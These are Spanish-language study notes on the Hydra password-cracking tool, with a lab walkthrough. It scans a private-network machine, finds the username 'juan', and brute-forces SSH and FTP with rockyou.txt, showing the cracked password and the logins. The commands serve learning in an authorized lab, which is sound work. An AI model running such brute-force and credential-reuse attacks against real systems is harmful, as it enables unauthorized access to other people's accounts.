# Hydra - Ataque a Contraseñas

> [!info] Idea principal
> Hydra es una herramienta de fuerza bruta que permite probar muchas contraseñas contra un servicio (SSH, FTP, HTTP, etc.) cuando ya conozco un usuario valido.

## Que es Hydra

Hydra automatiza los ataques de fuerza bruta y de diccionario contra servicios que piden autenticacion.

Con Hydra puedo:

- Probar una lista de contraseñas contra un usuario conocido.
- Probar una lista de usuarios contra una contraseña.
- Atacar varios servicios: `ssh`, `ftp`, `http`, `smb`, etc.
- Usar diccionarios como `rockyou.txt`.

> [!warning] Importante
> Usar Hydra solo en maquinas propias, laboratorios o entornos donde tengas permiso.

## Sintaxis Basica

```bash
hydra -l usuario -P diccionario servicio://IP
```

### Parametros mas Importantes

- `-l`: un unico usuario (login).
- `-L`: una lista de usuarios (archivo).
- `-p`: una unica contraseña.
- `-P`: una lista de contraseñas (diccionario).
- `-t`: numero de tareas en paralelo.
- `servicio://IP`: protocolo y objetivo (por ejemplo `ssh://192.168.0.242`).

> [!note] Como recordarlo
> La minuscula (`-l`, `-p`) es para un unico valor. La mayuscula (`-L`, `-P`) es para una lista.

## Caso Practico

### Paso 1: Descubrir Hosts en la Red

Uso `arp-scan` para ver que maquinas hay activas en la red local.

```bash
arp-scan -I eth0 --localnet
```

```text
192.168.0.242    08:00:27:ce:44:a6       (Unknown)
```

### Paso 2: Escanear el Objetivo

Lanzo un escaneo completo con Nmap contra la maquina elegida.

```bash
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 192.168.0.242 -oN escaneo_principal
```

Resultado de los servicios encontrados:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    nginx 1.22.1
```

> [!tip] Puertos interesantes
> Tengo `ftp` (21) y `ssh` (22) abiertos. Ambos piden usuario y contraseña, asi que son buenos objetivos para Hydra.

### Paso 3: Investigar la Web

Reviso el servicio HTTP del puerto `80` y encuentro un mensaje:

```text
Hi, sysadmin
I want you to know that I've just uploaded the new files into the FTP Server.
See you,
juan.
```

> [!info] Pista importante
> El mensaje esta firmado por **juan**. Ya tengo un usuario valido para atacar con Hydra.

### Paso 4: Fuerza Bruta a SSH

Ataco el servicio SSH usando el usuario `juan` y el diccionario `rockyou.txt`.

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.242
```

Resultado:

```text
[22][ssh] host: 192.168.0.242   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
```

> [!success] Contraseña encontrada
> Usuario: `juan` — Contraseña: `alexis`

> [!tip] Consejo para SSH
> SSH suele limitar las conexiones en paralelo. Si veo errores o va lento, reduzco las tareas con `-t 4`.

### Paso 5: Conectarme por SSH

Con las credenciales ya puedo iniciar sesion.

```bash
ssh juan@192.168.0.242
```

```text
juan@friendly3:~$ whoami
juan
```

> [!success] Acceso conseguido
> Estoy dentro de la maquina como el usuario `juan`.

## Otra Via: Fuerza Bruta a FTP

El mismo usuario suele reutilizar la contraseña en otros servicios. Pruebo tambien contra FTP.

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.242
```

Resultado:

```text
[21][ftp] host: 192.168.0.242   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
```

Me conecto por FTP con esas credenciales:

```bash
ftp 192.168.0.242
```

```text
Name (192.168.0.242:timmy): juan
331 Please specify the password.
Password:
230 Login successful.
```

> [!note] Ojo con los comandos
> Dentro de FTP no funcionan comandos del sistema como `whoami`. Solo comandos propios de FTP (`ls`, `get`, `put`, `cd`, etc.).

---

## Comandos Utiles

### Ataque a contraseñas (usuario conocido)

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.242
```

### Ataque a FTP

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.242
```

### Reducir tareas en paralelo (recomendado para SSH)

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.0.242
```

## Flujo Resumido

> [!example] Pasos tipicos
> 1. Descubrir hosts activos con `arp-scan`.
> 2. Escanear el objetivo con `nmap`.
> 3. Buscar un usuario valido (web, banners, mensajes...).
> 4. Lanzar Hydra con `-l usuario -P diccionario`.
> 5. Usar la contraseña encontrada para conectarme.
> 6. Probar la misma credencial en otros servicios.

## Checklist Rapido

- [ ] Confirmar que tengo permiso para atacar la maquina.
- [ ] Identificar servicios de login abiertos (`ssh`, `ftp`...).
- [ ] Conseguir al menos un usuario valido.
- [ ] Elegir un diccionario (`rockyou.txt`).
- [ ] Lanzar Hydra con `-l` y `-P`.
- [ ] Reducir tareas con `-t 4` si es SSH.
- [ ] Guardar la credencial encontrada.
- [ ] Reutilizar la credencial en otros servicios.
